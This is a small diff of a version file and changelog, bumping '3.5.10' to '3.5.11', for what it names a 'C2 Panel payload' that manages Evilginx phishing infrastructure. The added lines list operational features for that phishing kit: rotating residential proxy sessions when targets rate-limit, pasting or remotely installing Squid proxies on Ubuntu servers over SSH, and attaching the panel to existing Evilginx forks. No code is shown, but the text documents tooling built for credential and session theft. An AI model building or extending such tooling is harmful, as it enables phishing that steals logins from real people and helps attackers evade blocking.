@@ -1,5 +1,8 @@
-3.5.10
+3.5.11
 C2 Panel payload
+DataImpulse residential gateway (login/password on the C2 box only): Enable on a phishlet, idle/429 rotates sessid
+Manual Rise: copy the Linode Squid bash for paste-on any Ubuntu
+Manual Install: panel SSHs into a given Ubuntu (password or PEM) and installs the same Squid, then adds it as custom HTTP
 Carousel OFF: origin 429 does not rotate or detach — assigned hop stays; Carousel ON still rotates the queue
 INSTALL ONLY CP: attach the panel to an already-installed Evilginx of any fork; do not clone or replace the engine
 Panel .env: EVILGINX_BIN / PHISHLETS_DIR / EVILGINX_ARGS so Pro and custom binaries start correctly
